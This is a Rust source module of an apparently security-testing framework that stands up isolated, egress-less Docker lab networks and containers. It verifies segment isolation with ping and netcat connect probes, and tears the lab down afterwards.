//! Bring an [`Environment`] up as Docker networks and containers, and tear it
//! down (ADR-0003: bollard; ADR-0006 layer 1 and ADR-0011: egress-less
//! isolation).
//!
//! The environment/network layer (docs/rules/design.md section 2): this is the
//! only module that uses bollard, and it depends on the pure [`Environment`]
//! model. Each segment becomes one Docker network created `internal: true`
//! (every segment, the vantage's included), so nothing in the lab has a route to
//! the internet or to production (docs/rules/security.md section 1). Each
//! workload becomes a container attached to its segment's network *only* (never
//! the default bridge, which would re-add egress), aliased by its workload name
//! so a scope-resolved host like `db` is reachable in the lab by that name.
//!
//! The MVP realises the membership-only model (ADR-0011): a boundary is
//! separate networks with no connection between them, and a non-empty `allow` is
//! refused upstream, so no cross-segment path is wired here; the firewall
//! gateway for port-level boundaries is Phase 4 / M3.
//!
//! This unit stands the lab up, tears it down, and verifies isolation before a
//! run. It makes no test verdict. That the egress-less flag is set is checked
//! structurally (the integration test inspects it); that a declared-forbidden
//! path is blocked at the membership level is [`boundary_self_check`] (Decision
//! N step 4), which probes it behaviourally with a positive control and refuses
//! a run whose forbidden path is reachable.
//!
//! It also *executes* a capability from the attacker's vantage:
//! [`tcp_reachable_from`] runs a TCP-connect probe from a container on a lab
//! network and reuses `tcp_connect`'s classification (#27, a ADR-0002
//! refinement). That is a downward dependency on the capability layer, which the
//! design permits: capability sits below environment, so the orchestrator may
//! call its classification down. A host-run native connect is not usable here,
//! because the host has a route to every segment and so cannot observe an
//! inter-segment boundary; the attack must originate inside the lab.

use std::collections::HashMap;

use bollard::Docker;
use bollard::models::{
    ContainerCreateBody, ContainerState, ContainerStateStatusEnum, EndpointSettings,
    HealthStatusEnum, NetworkCreateRequest, NetworkingConfig,
};
use bollard::query_parameters::{CreateContainerOptions, RemoveContainerOptions};

use std::time::Duration;

use crate::capability::tcp_connect::{ConnectOutcome, classify_connect, connect_summary};
use crate::environment::{Environment, WorkloadKind};
use crate::error::{Error, Result};
use crate::evidence::{EvidenceDraft, NodeRef, Reproduction};
use crate::intensity::Intensity;
use crate::observation::{Confidence, Observation};
use crate::scope::{Scope, ScopedTarget};

/// A segment's Docker network, paired with the segment it was built from so the
/// boundary self-check (and later units) can map a segment to its network
/// without reparsing the name.
#[derive(Debug, Clone)]
pub struct LabNetwork {
    segment: String,
    name: String,
}

impl LabNetwork {
    /// The segment this network stands for.
    pub fn segment(&self) -> &str {
        &self.segment
    }

    /// The Docker network name.
    pub fn name(&self) -> &str {
        &self.name
    }
}

/// A workload's Docker container, paired with the workload and segment it was
/// built from so the boundary self-check (and later units) can find a named
/// workload's container and its segment without reparsing the name.
#[derive(Debug, Clone)]
pub struct LabContainer {
    workload: String,
    segment: String,
    name: String,
}

impl LabContainer {
    /// The workload this container stands for.
    pub fn workload(&self) -> &str {
        &self.workload
    }

    /// The segment the workload sits in.
    pub fn segment(&self) -> &str {
        &self.segment
    }

    /// The Docker container name.
    pub fn name(&self) -> &str {
        &self.name
    }
}

/// A running lab: the Docker networks and containers a [`bring_up`] created.
///
/// The normal path is the explicit async [`teardown`](RunningLab::teardown).
/// `Drop` is the backstop for a forgotten teardown or a panic: it removes what
/// it can and warns, never panicking. A leaked network or container is a
/// resource leak, not a scope escape (the networks are egress-less), but
/// teardown is not optional (docs/rules/security.md section 1).
pub struct RunningLab {
    docker: Docker,
    networks: Vec<LabNetwork>,
    containers: Vec<LabContainer>,
    torn_down: bool,
}

/// A short, process-unique tag so repeated runs do not collide and teardown
/// targets exactly this run's objects. Unique within a process via the counter;
/// unlikely to collide across processes via the time and pid mix.
fn run_id() -> String {
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::time::{SystemTime, UNIX_EPOCH};
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let seq = COUNTER.fetch_add(1, Ordering::Relaxed);
    format!(
        "redstep-{:x}-{seq:x}",
        nanos as u64 ^ (std::process::id() as u64)
    )
}

fn lab_unavailable(err: impl std::fmt::Display) -> Error {
    Error::LabUnavailable {
        reason: err.to_string(),
    }
}

/// The network name for a segment in this run.
fn network_name(run_id: &str, segment: &str) -> String {
    format!("{run_id}-net-{segment}")
}

/// The container name for a workload in this run.
fn container_name(run_id: &str, workload: &str) -> String {
    format!("{run_id}-{workload}")
}

/// The container command for a workload, by kind (#46). A `Standin` runs
/// `sleep 3600` to stay alive and inspectable (its image, e.g. busybox, would
/// otherwise exit at once); a `Service` runs its own command, where `None`
/// omits `Cmd` from the create request so the daemon uses the image's own
/// default `CMD`, and `Some` is an explicit command. Pure, so the mapping is
/// testable without Docker.
fn workload_cmd(kind: &WorkloadKind) -> Option<Vec<String>> {
    match kind {
        WorkloadKind::Standin => Some(vec!["sleep".to_owned(), "3600".to_owned()]),
        WorkloadKind::Service { command } => command.clone(),
    }
}

/// Bring `env` up: one egress-less network per segment, then each workload as a
/// container attached to its segment's network. `docker` is injected so a test
/// controls the connection. On any failure, what was already created is torn
/// down before returning, so a partial lab never leaks.
pub async fn bring_up(docker: &Docker, env: &Environment) -> Result<RunningLab> {
    let run_id = run_id();
    let mut lab = RunningLab {
        docker: docker.clone(),
        networks: Vec::new(),
        containers: Vec::new(),
        torn_down: false,
    };

    match provision(docker, env, &run_id, &mut lab).await {
        Ok(()) => Ok(lab),
        Err(e) => {
            // Tear down the partial lab before surfacing the error; report a
            // cleanup failure rather than hiding it under the original error.
            if let Err(cleanup) = remove_all(docker, &lab.containers, &lab.networks).await {
                eprintln!("redstep: cleanup after a failed bring-up also failed: {cleanup}");
            }
            lab.torn_down = true;
            Err(e)
        }
    }
}

/// Split an image reference into the `(from_image, tag)` pair `create_image`
/// wants, as borrows of `image` (or the literal `"latest"`).
///
/// Three reference shapes matter, and splitting on the last `:` over the whole
/// string (as this once did) mis-reads two of them:
///
/// - a digest pin, `repo@sha256:...`: everything after the `@` is the digest,
///   which goes in the tag field. The Docker Engine API documents `tag` as "Tag
///   or digest", and both a digest in `tag` and a digest embedded in `fromImage`
///   pull by digest (verified against a live daemon, #48); the tag field is used
///   so `from_image` stays a pure name.
/// - a registry with a port, `localhost:5000/app`: the `:` belongs to the host,
///   not a tag. A tag colon is therefore the last `:` that falls *after* the
///   last `/`, so a `host:port` before the path is never read as a tag.
/// - a bare name, `redis`: no tag and no digest, so the `latest` default stands.
///
/// Pure, so every shape is unit-tested without Docker (`#48` made real-image
/// `.service(..)` references, which carry these shapes, the normal case).
fn parse_image_ref(image: &str) -> (&str, &str) {
    if let Some((name, digest)) = image.split_once('@') {
        return (name, digest);
    }
    let path_start = image.rfind('/').map_or(0, |i| i + 1);
    match image[path_start..].rfind(':') {
        Some(rel) => {
            let at = path_start + rel;
            (&image[..at], &image[at + 1..])
        }
        None => (image, "latest"),
    }
}

/// Pull `image` so `create_container` finds it. The Docker API's
/// `create_container` does not pull and returns 404 for an absent image, so the
/// orchestrator pulls first. Idempotent: a present image streams quickly and
/// succeeds. [`parse_image_ref`] derives the name and tag (or digest), handling
/// the MVP's `busybox:1.37`/`postgres:16`, a registry `host:port`, and a
/// `@sha256:...` digest alike.
async fn pull_image(docker: &Docker, image: &str) -> Result<()> {
    use futures_util::StreamExt;

    let (from_image, tag) = parse_image_ref(image);
    let options = bollard::query_parameters::CreateImageOptionsBuilder::default()
        .from_image(from_image)
        .tag(tag)
        .build();
    let mut stream = docker.create_image(Some(options), None, None);
    while let Some(item) = stream.next().await {
        item.map_err(lab_unavailable)?;
    }
    Ok(())
}

/// The prefix of the project's own fixture images (the playground's
/// `redstep/{db,api,web}:mvp` and `redstep/api:fixed`, #47/#54), built locally by
/// `playground/build.sh` and never pushed to a registry (`playground/README`).
/// See [`is_local_only_image`] for what refusing to pull them protects against.
const LOCAL_IMAGE_PREFIX: &str = "redstep/";

/// Whether `image` is one of the project's own local-only fixtures, matched by
/// the `redstep/` namespace. They must be present locally and never pulled: the
/// unqualified `redstep/...` form resolves against the default registry as
/// `docker.io/redstep/*`, so pulling an absent one would fetch and run whatever a
/// squatter published there as the "target" (#53); refusing the pull closes that.
/// A *qualified* `docker.io/redstep/...` a developer writes is not matched and
/// still pulls: that is the user naming a registry image on purpose, not the
/// framework reaching for one. Layer-1 isolation (ADR-0006) bounds the blast
/// radius regardless. Pure, so the rule is unit-tested offline (RK-014: a safety
/// rule should not be guarded only by a self-skipping Docker test).
fn is_local_only_image(image: &str) -> bool {
    image.starts_with(LOCAL_IMAGE_PREFIX)
}

/// Ensure `image` is present locally, pulling it only if it is not. A present
/// image is accepted at the inspect check; an absent [`is_local_only_image`]
/// fixture is refused with a `playground/build.sh` hint rather than pulled (see
/// that function for why, #53); any other absent image is pulled, surfacing a
/// pull failure as [`Error::LabUnavailable`].
///
/// A present image is never re-pulled, so a mutable registry tag is not refreshed
/// once it is local. That is acceptable here: the MVP's tags are pinned
/// (`busybox:1.37`, `postgres:16`) and the fixtures are local-only.
async fn ensure_image(docker: &Docker, image: &str) -> Result<()> {
    if docker.inspect_image(image).await.is_ok() {
        return Ok(());
    }
    if is_local_only_image(image) {
        return Err(Error::LabUnavailable {
            reason: format!(
                "{image} is a local-only playground image and is not present; \
                 build it with playground/build.sh (local-only images are never \
                 pulled from a registry)"
            ),
        });
    }
    pull_image(docker, image).await
}

async fn provision(
    docker: &Docker,
    env: &Environment,
    run_id: &str,
    lab: &mut RunningLab,
) -> Result<()> {
    // Ensure each distinct workload image is present before any container is
    // created (see `ensure_image` for why a present image is not re-pulled).
    let mut ensured = std::collections::HashSet::new();
    for workload in env.workloads() {
        if ensured.insert(workload.image()) {
            ensure_image(docker, workload.image()).await?;
        }
    }

    for segment in env.segments() {
        let name = network_name(run_id, segment.name());
        docker
            .create_network(NetworkCreateRequest {
                name: name.clone(),
                internal: Some(true),
                ..Default::default()
            })
            .await
            .map_err(lab_unavailable)?;
        lab.networks.push(LabNetwork {
            segment: segment.name().to_owned(),
            name,
        });
    }

    for workload in env.workloads() {
        let cname = container_name(run_id, workload.name());
        let net = network_name(run_id, workload.segment());
        // Attach to the segment network ONLY, via networking_config (so the
        // container is not also on the default bridge, which would re-add
        // egress), aliased by the workload name so `db` resolves in the lab.
        let endpoint = EndpointSettings {
            aliases: Some(vec![workload.name().to_owned()]),
            ..Default::default()
        };
        let endpoints = HashMap::from([(net, endpoint)]);
        docker
            .create_container(
                Some(CreateContainerOptions {
                    name: Some(cname.clone()),
                    ..Default::default()
                }),
                ContainerCreateBody {
                    image: Some(workload.image().to_owned()),
                    // A stand-in runs `sleep` to stay inspectable; a real service
                    // runs its own command (#46, see `workload_cmd`).
                    cmd: workload_cmd(workload.kind()),
                    networking_config: Some(NetworkingConfig {
                        endpoints_config: Some(endpoints),
                    }),
                    ..Default::default()
                },
            )
            .await
            .map_err(lab_unavailable)?;
        lab.containers.push(LabContainer {
            workload: workload.name().to_owned(),
            segment: workload.segment().to_owned(),
            name: cname.clone(),
        });
        docker
            .start_container(
                &cname,
                None::<bollard::query_parameters::StartContainerOptions>,
            )
            .await
            .map_err(lab_unavailable)?;
    }

    // Wait until every workload reports healthy before returning, so a probe
    // after bring-up is meaningful rather than racing a slow-start real image
    // (#47). A stand-in declares no HEALTHCHECK and is ready at once, so the
    // boundary demo is unchanged. On failure this propagates as `Err`, which
    // `bring_up` tears the partial lab down on.
    await_readiness(
        &lab.containers,
        &DockerHealthPoller { docker },
        READINESS_POLL,
        READINESS_MAX_POLLS,
    )
    .await?;

    Ok(())
}

/// How often `await_readiness` re-polls, and how many times before it gives up.
/// The budget (`500ms * 120 = 60s`) is generous enough for a first-boot postgres
/// to run its initdb seed and open its TCP listener; the images use a short
/// HEALTHCHECK interval so `healthy` appears well inside it.
const READINESS_POLL: Duration = Duration::from_millis(500);
const READINESS_MAX_POLLS: u32 = 120;

/// Whether a container is ready to be probed, read from its Docker health status.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Readiness {
    /// Ready now: healthy, or no HEALTHCHECK declared (a stand-in).
    Ready,
    /// Still coming up (starting, or no result reported yet): re-poll.
    Waiting,
    /// Reported unhealthy: a definite failure, not something to wait out.
    Failed,
}

/// Map a container's Docker health status to a [`Readiness`]. A container with no
/// HEALTHCHECK reports no status (`None`) or `NONE` and is ready at once, so a
/// stand-in (busybox `sleep`, no healthcheck) keeps its pre-#47 behaviour and the
/// boundary demo is unchanged. `HEALTHY` is ready; `STARTING`/`EMPTY` (a
/// healthcheck declared but with no result yet) is still coming up; `UNHEALTHY`
/// is a failure that must not be waited out. Pure, so the mapping is unit-tested
/// without Docker.
fn health_readiness(status: Option<&HealthStatusEnum>) -> Readiness {
    match status {
        None | Some(HealthStatusEnum::NONE) | Some(HealthStatusEnum::HEALTHY) => Readiness::Ready,
        Some(HealthStatusEnum::STARTING) | Some(HealthStatusEnum::EMPTY) => Readiness::Waiting,
        Some(HealthStatusEnum::UNHEALTHY) => Readiness::Failed,
    }
}

/// Reads a container's [`Readiness`]. [`DockerHealthPoller`] inspects the real
/// container; the trait is the seam a unit test fills, so `await_readiness`'s loop
/// (all ready / any failed / timeout) is verified without a Docker daemon, the way
/// [`Prober`] does for the boundary self-check.
trait HealthPoller {
    async fn readiness(&self, container: &str) -> Result<Readiness>;
}

/// The real poller: inspect the container and classify its health status.
struct DockerHealthPoller<'a> {
    docker: &'a Docker,
}

impl HealthPoller for DockerHealthPoller<'_> {
    async fn readiness(&self, container: &str) -> Result<Readiness> {
        let info = self
            .docker
            .inspect_container(
                container,
                None::<bollard::query_parameters::InspectContainerOptions>,
            )
            .await
            .map_err(lab_unavailable)?;
        let status = info.state.and_then(|s| s.health).and_then(|h| h.status);
        Ok(health_readiness(status.as_ref()))
    }
}

/// Wait until every container is [`Readiness::Ready`]. Polls every container each
/// round (not a representative, so a non-first laggard is not missed, RK-009) over
/// an injectable `poller`, re-polling every `interval` up to `max_polls` rounds.
/// Fails closed: the moment any container is `Failed` it returns
/// [`Error::LabUnavailable`] naming it, and if the budget runs out with any still
/// `Waiting` it returns `LabUnavailable` naming them, so a never-healthy service
/// is a bounded error rather than a hang (CLAUDE.md row 5).
///
/// It reads only the health status, not whether the container is still running,
/// so a `Service` that declares no HEALTHCHECK and then exits reads `None` ->
/// `Ready`. That is a known limit, not a verdict hazard: the playground tiers all
/// declare healthchecks (a crash shows as unhealthy, not `None`), and a dead
/// target downstream fails the boundary self-check's positive control closed and
/// reads as `Low`-confidence unreachable at a vantage probe, which the oracle's
/// default-`High` keeps out of a confident PASS.
async fn await_readiness<P: HealthPoller>(
    containers: &[LabContainer],
    poller: &P,
    interval: Duration,
    max_polls: u32,
) -> Result<()> {
    let mut waiting: Vec<String> = Vec::new();
    for _ in 0..max_polls.max(1) {
        waiting.clear();
        for c in containers {
            match poller.readiness(c.name()).await? {
                Readiness::Ready => {}
                Readiness::Waiting => waiting.push(c.workload().to_owned()),
                Readiness::Failed => {
                    return Err(Error::LabUnavailable {
                        reason: format!(
                            "workload {:?} reported its healthcheck unhealthy during bring-up",
                            c.workload()
                        ),
                    });
                }
            }
        }
        if waiting.is_empty() {
            return Ok(());
        }
        tokio::time::sleep(interval).await;
    }
    Err(Error::LabUnavailable {
        reason: format!(
            "lab workloads were not ready within the bring-up budget; still starting: {waiting:?}"
        ),
    })
}

/// Remove every listed container (forced) then every listed network, best
/// effort: keep going past a failure and return the first error, if any.
async fn remove_all(
    docker: &Docker,
    containers: &[LabContainer],
    networks: &[LabNetwork],
) -> Result<()> {
    let mut first_err: Option<Error> = None;
    for c in containers {
        if let Err(e) = docker
            .remove_container(
                c.name(),
                Some(RemoveContainerOptions {
                    force: true,
                    ..Default::default()
                }),
            )
            .await
        {
            first_err.get_or_insert_with(|| lab_unavailable(e));
        }
    }
    for n in networks {
        if let Err(e) = docker.remove_network(n.name()).await {
            first_err.get_or_insert_with(|| lab_unavailable(e));
        }
    }
    match first_err {
        Some(e) => Err(e),
        None => Ok(()),
    }
}

/// A tiny pinned image carrying `ping` and `nc`, for the probe containers: the
/// self-check's ICMP probe and the vantage TCP-connect probe (#27). A workload
/// image like `postgres:16` may not carry either.
const PROBE_IMAGE: &str = "busybox:1.37";

/// Something that tests whether a probe placed on `network` can reach `target`
/// (a container name) by ICMP. [`DockerProber`] is the real implementation; the
/// trait is the seam a unit test fills, so the gate's decision logic is verified
/// without a Docker daemon (the behaviour of the probe itself is CI-verified).
trait Prober {
    async fn reaches(&self, network: &str, target: &str) -> Result<bool>;
}

/// Verify every declared-forbidden path is actually blocked, before any test
/// runs (ADR-0011 step 4). For each boundary (an empty `allow` means the path
/// is blocked, and a non-empty one is refused at build) and *every* workload in
/// the `to` segment, a probe in the `from` segment must fail to reach the
/// workload while a positive-control probe in the `to` segment reaches it, so a
/// broken probe cannot read as isolation.
///
/// `Ok(())` only when every declared boundary that has a `to`-workload is
/// verified blocked. A reachable forbidden path is [`Error::BoundaryViolated`];
/// a control that cannot reach, an undeterminable probe, or any probe failure is
/// [`Error::LabUnavailable`], so the run fails closed rather than proceeding on a
/// lab whose isolation is uncertain. The result is distinct from a test verdict.
///
/// This verifies *membership* isolation: reachability is ICMP to the target's
/// container name, which Docker's embedded DNS resolves only for peers on the
/// same network, so it detects a workload wrongly attached to the `from` network
/// (the MVP's all-or-nothing boundary) and needs no listener. It does not verify
/// a routed or port-level boundary: the firewall gateway (ADR-0011, Phase 4 /
/// M3) adds those and will need a TCP-to-port probe, not name-based ICMP.
///
/// The lab-wired runner gates on this before any test ([`run_in_running_lab`](crate::run_in_running_lab),
/// #28): a failure is returned as `RunError::Lab` and no test runs. A caller that
/// invokes it directly must likewise treat both error variants as hard stops,
/// never log-and-continue, and re-run the check after any late change to the lab.
pub async fn boundary_self_check(
    docker: &Docker,
    env: &Environment,
    lab: &RunningLab,
) -> Result<()> {
    pull_image(docker, PROBE_IMAGE).await?;
    check_boundaries(env, lab, &DockerProber { docker }).await
}

/// The gate's decision logic, over an injectable `prober` so it is unit-testable
/// without Docker.
async fn check_boundaries<P: Prober>(
    env: &Environment,
    lab: &RunningLab,
    prober: &P,
) -> Result<()> {
    for boundary in env.boundaries() {
        let from = boundary.from();
        let to = boundary.to();
        let from_net = segment_network(lab, from)?;
        let to_net = segment_network(lab, to)?;

        // Probe every workload in `to`, not a representative: the break this
        // exists to catch is a single workload wrongly attached to `from`, which
        // the self-check must not assume bring-up never produces.
        for target in lab.containers().iter().filter(|c| c.segment() == to) {
            // Positive control first: the target is reachable from its own
            // segment, so a later "unreachable" is a real block, not a broken
            // probe.
            if !prober.reaches(to_net, target.name()).await? {
                return Err(Error::LabUnavailable {
                    reason: format!(
                        "boundary self-check could not reach {to} workload {:?} from its own segment; \
                         the probe is untrustworthy, so isolation cannot be certified",
                        target.workload()
                    ),
                });
            }
            if prober.reaches(from_net, target.name()).await? {
                return Err(Error::BoundaryViolated {
                    from: from.to_owned(),
                    to: to.to_owned(),
                });
            }
        }
    }

    Ok(())
}

/// The Docker network name for a segment in this lab.
fn segment_network<'a>(lab: &'a RunningLab, segment: &str) -> Result<&'a str> {
    lab.networks()
        .iter()
        .find(|n| n.segment() == segment)
        .map(LabNetwork::name)
        .ok_or_else(|| Error::LabUnavailable {
            reason: format!("no network for segment {segment:?} in the running lab"),
        })
}

/// The real prober: a disposable `busybox` container that pings `target` from
/// `network`.
struct DockerProber<'a> {
    docker: &'a Docker,
}

impl Prober for DockerProber<'_> {
    async fn reaches(&self, network: &str, target: &str) -> Result<bool> {
        // Two packets within a 2s deadline: one lost packet should not read a
        // reachable target as blocked (the false-negative, row-6 direction). The
        // dominant correct case fails instantly on name resolution.
        let cmd = vec![
            "ping".to_owned(),
            "-c".to_owned(),
            "2".to_owned(),
            "-w".to_owned(),
            "2".to_owned(),
            target.to_owned(),
        ];
        // `-c 2 -w 2` exits within a few seconds; 10s of polling is ample slack
        // for container create/start/exit latency and fails closed past that.
        let state = run_probe_cmd(self.docker, network, cmd, Duration::from_secs(10)).await?;
        classify_probe(&state)
    }
}

/// Run `cmd` in a disposable busybox container on `network`, wait up to
/// `max_wait` for it to exit, and return its final state. `max_wait` is derived
/// from the probe's own deadline by the caller (the ping's `-w`, the connect's
/// `-w`), so a probe that does not exit fails closed rather than hanging. The
/// container is removed before returning, even on error. Shared by the boundary
/// self-check (ping) and the vantage reachability probe (nc). A probe dropped
/// mid-run by a cancelled future can leak an egress-less container (row 5, not a
/// scope escape); the run paths do not cancel it.
async fn run_probe_cmd(
    docker: &Docker,
    network: &str,
    cmd: Vec<String>,
    max_wait: Duration,
) -> Result<ContainerState> {
    let name = format!("{}-probe", run_id());
    let result = run_probe_to_exit(docker, &name, network, cmd, max_wait).await;
    let _ = docker
        .remove_container(
            &name,
            Some(RemoveContainerOptions {
                force: true,
                ..Default::default()
            }),
        )
        .await;
    result
}

/// Read a container's accumulated stdout and stderr WITHOUT removing it. Unlike
/// [`run_probe_capturing`], which reads then force-removes its throwaway probe,
/// this reads a persistent lab workload's logs: the SSRF out-of-band witness is a
/// per-probe token appearing in the canary's logs (#65), and the canary stays up.
/// Returns `(stdout, stderr)`, lossy for invalid UTF-8.
async fn read_container_logs(docker: &Docker, container: &str) -> Result<(String, String)> {
    use futures_util::StreamExt;
    let options = bollard::query_parameters::LogsOptionsBuilder::default()
        .stdout(true)
        .stderr(true)
        .build();
    let mut stream = docker.logs(container, Some(options));
    let (mut stdout, mut stderr) = (Vec::new(), Vec::new());
    while let Some(frame) = stream.next().await {
        match frame.map_err(lab_unavailable)? {
            bollard::container::LogOutput::StdOut { message } => stdout.extend_from_slice(&message),
            bollard::container::LogOutput::StdErr { message } => stderr.extend_from_slice(&message),
            _ => {}
        }
    }
    Ok((
        String::from_utf8_lossy(&stdout).into_owned(),
        String::from_utf8_lossy(&stderr).into_owned(),
    ))
}

/// Like [`run_probe_cmd`], but capture the container's stdout and stderr (for an
/// HTTP probe, the response body and, with `wget -S`, the response headers) before
/// removing it. `run_probe_cmd` removes the container as it returns, so it can only
/// yield an exit code; the HTTP witness checks need the body to witness the marker
/// (the SQLi flag, the traversal sentinel) and the headers to see a followed
/// redirect (#55). Returns `(state, stdout, stderr)`. The logs are read after the
/// probe exits and before removal. This is the narrow log-capturing path #50 needs;
/// the generalized
/// in-container seam is M3 (mvp.md).
async fn run_probe_capturing(
    docker: &Docker,
    network: &str,
    cmd: Vec<String>,
    max_wait: Duration,
) -> Result<(ContainerState, String, String)> {
    let name = format!("{}-probe", run_id());
    let result = async {
        let state = run_probe_to_exit(docker, &name, network, cmd, max_wait).await?;
        let (stdout, stderr) = read_container_logs(docker, &name).await?;
        Ok((state, stdout, stderr))
    }
    .await;
    let _ = docker
        .remove_container(
            &name,
            Some(RemoveContainerOptions {
                force: true,
                ..Default::default()
            }),
        )
        .await;
    result
}

async fn run_probe_to_exit(
    docker: &Docker,
    name: &str,
    network: &str,
    cmd: Vec<String>,
    max_wait: Duration,
) -> Result<ContainerState> {
    let endpoints = HashMap::from([(network.to_owned(), EndpointSettings::default())]);
    docker
        .create_container(
            Some(CreateContainerOptions {
                name: Some(name.to_owned()),
                ..Default::default()
            }),
            ContainerCreateBody {
                image: Some(PROBE_IMAGE.to_owned()),
                cmd: Some(cmd),
                networking_config: Some(NetworkingConfig {
                    endpoints_config: Some(endpoints),
                }),
                ..Default::default()
            },
        )
        .await
        .map_err(lab_unavailable)?;
    docker
        .start_container(
            name,
            None::<bollard::query_parameters::StartContainerOptions>,
        )
        .await
        .map_err(lab_unavailable)?;
    // Poll every 500ms up to `max_wait` (derived from the probe's own deadline),
    // so a stuck probe fails closed rather than hanging.
    let polls = (max_wait.as_millis() / 500).max(1) as usize;
    for _ in 0..polls {
        let info = docker
            .inspect_container(
                name,
                None::<bollard::query_parameters::InspectContainerOptions>,
            )
            .await
            .map_err(lab_unavailable)?;
        let state = info.state.unwrap_or_default();
        if state.running != Some(true) {
            return Ok(state);
        }
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
    Err(Error::LabUnavailable {
        reason: format!("probe {name:?} did not exit within the timeout"),
    })
}

/// A finished probe's exit code, or `Err(LabUnavailable)` if it did not cleanly
/// exit: an undeterminable probe must fail closed, never be read as a result.
fn finished_exit_code(state: &ContainerState) -> Result<i64> {
    if state.status == Some(ContainerStateStatusEnum::EXITED)
        && let Some(code) = state.exit_code
    {
        return Ok(code);
    }
    Err(Error::LabUnavailable {
        reason: format!(
            "probe exited abnormally (status {:?}, code {:?})",
            state.status, state.exit_code
        ),
    })
}

/// Read a finished ping probe as reachable (a reply, exit 0) or not (clean
/// no-reply/unresolved, busybox exit 1). Any other code is `Err(LabUnavailable)`:
/// the self-check must refuse rather than read an abnormal probe as "blocked".
fn classify_probe(state: &ContainerState) -> Result<bool> {
    match finished_exit_code(state)? {
        0 => Ok(true),
        1 => Ok(false),
        other => Err(Error::LabUnavailable {
            reason: format!(
                "boundary self-check ping probe exited with {other}; isolation cannot be certified"
            ),
        }),
    }
}

/// The busybox `nc` connect probe as argv (never a shell line): connect to
/// `host:port`, giving up after `secs`, reading nothing. Passing argv directly
/// rather than through `sh -c` means a crafted host or port is one argument to
/// `nc`, not text a shell could interpret, so it cannot inject a command into the
/// probe container. Pure, so the argv shape is unit-tested without Docker.
fn nc_cmd(host: &str, port: u16, secs: u64) -> Vec<String> {
    vec![
        "nc".to_owned(),
        "-w".to_owned(),
        secs.to_string(),
        host.to_owned(),
        port.to_string(),
    ]
}

/// Read a finished busybox `nc` connect probe as a connect outcome: exit 0 is a
/// completed connect; exit 1 is `Indeterminate`, because busybox `nc` dies with 1
/// on a refusal, a timeout, or no route without distinguishing them, so it cannot
/// surface a `Refused`. Any other code, or a probe that did not cleanly exit
/// (crashed, killed, never ran), is `Err(LabUnavailable)`: an abnormal probe must
/// fail closed, never be read as a clean "unreachable" (CLAUDE.md row 6). Taking
/// the state (not a bare code) folds the exited-cleanly check in, so the whole
/// fail-closed mapping is unit-tested without Docker.
fn nc_result(state: &ContainerState) -> Result<ConnectOutcome> {
    match finished_exit_code(state)? {
        0 => Ok(ConnectOutcome::Connected),
        1 => Ok(ConnectOutcome::Indeterminate),
        other => Err(Error::LabUnavailable {
            reason: format!(
                "vantage nc probe exited with {other}; reachability cannot be determined"
            ),
        }),
    }
}

/// Observe whether a scope-resolved `target` is reachable by TCP from the
/// attacker's vantage, running a busybox `nc` connect from a container on the
/// `vantage` network (#27). A host-run native connect is not usable: the host has
/// a route to every segment and so cannot observe an inter-segment boundary, so
/// the attack must originate inside the lab. The types are the gate: a
/// [`LabNetwork`] is only produced by `bring_up` (so the probe runs on a real,
/// egress-less lab network, not an arbitrary one like `bridge`), and a
/// [`ScopedTarget`] is only produced by the scope resolver (so the probe cannot
/// be aimed at a raw address outside scope).
///
/// The observation reuses `tcp_connect`'s classification (a completed connect is
/// reachable at `High`; a failure is unreachable at `Low`, because busybox `nc`
/// cannot prove the port closed), so the native and vantage paths agree on the
/// reachability value a connect means. The confidence still differs by path (a
/// refused port is `High` unreachable natively but `Low` from the vantage) in
/// the one way that
/// matters: a `Low` "unreachable" from a single vantage connect cannot by itself
/// certify that a boundary held (the oracle's default `High` keeps it out of a
/// confident PASS); that certification is [`boundary_self_check`]'s job, with its
/// positive control. The draft is *not* a native `tcp_connect` record: it carries
/// a distinct capability name and records the vantage network, so a reader cannot
/// mistake an in-lab vantage probe for a host-run connect. An abnormal probe is
/// `Error::LabUnavailable`, fail-closed.
///
/// The draft carries a first-class `source` (ADR-0004's `NodeRef::Vantage`) and
/// a reproduction faithful enough to replay: it records the stable vantage
/// *segment*, not the run-scoped network name, so [`replay_vantage_probe`] can
/// re-run it against a fresh lab (ADR-0022, #29). Image-digest and data-pack
/// pinning stay deferred (ADR-0019, ADR-0018), so a replay reproduces against
/// the same `Environment`, not across image drift.
pub(crate) async fn tcp_reachable_from(
    docker: &Docker,
    vantage: &LabNetwork,
    target: &ScopedTarget,
    timeout: Duration,
) -> Result<(Observation<bool>, EvidenceDraft)> {
    // Whole seconds for `nc -w`; record this applied value, not the requested
    // `timeout`, so the reproduction restates what actually ran.
    let secs = timeout.as_secs().max(1);
    let applied = Duration::from_secs(secs);
    let host = target.host();
    let port = target.port();

    let cmd = nc_cmd(host, port, secs);
    // `nc` waits up to `secs`; allow that plus container create/start/exit slack.
    let state = run_probe_cmd(
        docker,
        vantage.name(),
        cmd,
        applied + Duration::from_secs(5),
    )
    .await?;
    let outcome = nc_result(&state)?;
    let observation = classify_connect(outcome);

    let spec = format!("{host}:{port}");
    let draft = vantage_draft(
        vantage.segment(),
        spec,
        &observation,
        connect_summary(outcome),
        applied,
    );
    Ok((observation, draft))
}

/// Compose the evidence draft for a vantage probe. Pure, so the first-class
/// `source` and the witness (the stable segment, not the run-scoped network
/// name) are testable without Docker, which is why it is lifted out of
/// [`tcp_reachable_from`]. The segment appears in both `source` (ADR-0004's
/// `NodeRef`) and the reproduction params: ADR-0004 keeps the reproduction
/// self-contained, the same reason `capability` and `target` sit on both.
fn vantage_draft(
    segment: &str,
    target_spec: String,
    observation: &Observation<bool>,
    summary: &str,
    applied: Duration,
) -> EvidenceDraft {
    EvidenceDraft {
        capability: "tcp_connect_vantage",
        target: target_spec.clone(),
        intensity: Intensity::Safe,
        observed: serde_json::Value::Bool(observation.value),
        confidence: observation.confidence,
        summary: summary.to_owned(),
        source: Some(NodeRef::Vantage {
            segment: segment.to_owned(),
        }),
        reproduction: Reproduction {
            capability: "tcp_connect_vantage".to_owned(),
            target: target_spec,
            params: serde_json::json!({
                "timeout_ms": applied.as_millis() as u64,
                "vantage_segment": segment,
            }),
        },
    }
}

/// The capability names of the HTTP witness techniques, as they appear in the
/// evidence `capability` field and the canonical JSON (a published contract, so
/// the string values are fixed). Shared by the context callers that run each check
